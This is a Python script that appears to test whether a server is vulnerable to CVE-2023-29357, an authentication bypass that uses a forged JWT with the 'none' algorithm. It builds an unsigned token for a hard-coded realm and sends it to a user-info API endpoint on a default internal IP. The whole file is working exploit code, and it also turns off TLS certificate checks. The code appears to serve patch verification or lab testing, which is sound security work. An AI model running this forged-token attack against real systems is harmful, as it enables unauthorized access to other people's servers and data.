#!/usr/bin/env python3
# Purpose: Test CVE-2023-29357 JWT "none" algorithm authentication bypass
# Outcome: Tests if v2 accepts unsigned JWT tokens to bypass authentication
# Based on: additional_resources/previous_exploits_github_projects/CVE-2023-29357/exploit.py

import json
import time
import base64
import requests
import sys

requests.packages.urllib3.disable_warnings()

def create_jwt_token(realm, client_id="00000003-0000-0ff1-ce00-000000000000"):
    """Create unsigned JWT token with 'none' algorithm"""
    header = {"alg": "none"}
    current_time = int(time.time())
    expiration_time = current_time + 3600
    
    aud = f"{client_id}@{realm}"
    
    payload = {
        "aud": aud,
        "iss": client_id,
        "nbf": current_time,
        "exp": expiration_time,
        "ver": "hashedprooftoken",
        "nameid": f'{client_id}@{realm}',
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True
    }
    
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    
    jwt_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"
    return jwt_token

if __name__ == "__main__":
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://10.10.10.166"
    target_url = target_url.rstrip('/')
    
    realm = "5637f856-255d-4039-b165-224f3371d1d4"  # Extracted from earlier test
    
    print(f"[*] Testing CVE-2023-29357 JWT 'none' algorithm bypass")
    print(f"[*] Target: {target_url}")
    print(f"[*] Realm: {realm}")
    
    jwt_token = create_jwt_token(realm)
    print(f"[*] Forged JWT Token: {jwt_token[:50]}...")
    
    headers = {
        "Accept": "application/json",
        "Authorization": f"Bearer {jwt_token}",
        "X-PROOF_TOKEN": jwt_token,
    }
    
    test_endpoint = f"{target_url}/_api/web/currentuser"
    print(f"[*] Testing endpoint: {test_endpoint}")
    
    response = requests.get(test_endpoint, headers=headers, verify=False, timeout=10)
    
    print(f"[*] Status Code: {response.status_code}")
    print(f"[*] Response Headers:")
    for header, value in response.headers.items():
        if header.lower() in ['www-authenticate', 'x-ms-diagnostics', 'set-cookie', 'sprequestguid']:
            print(f"    {header}: {value}")
    
    print(f"[*] Response Body (first 500 chars):")
    print(response.text[:500])
    
    if response.status_code == 200:
        print("\n[+] SUCCESS: Authentication bypassed! JWT 'none' algorithm accepted.")
        try:
            parsed = json.loads(response.text)
            print(f"[+] Authenticated as: {parsed.get('Title', 'Unknown')}")
        except:
            pass
    else:
        print("\n[-] FAILURE: Authentication bypass blocked.")
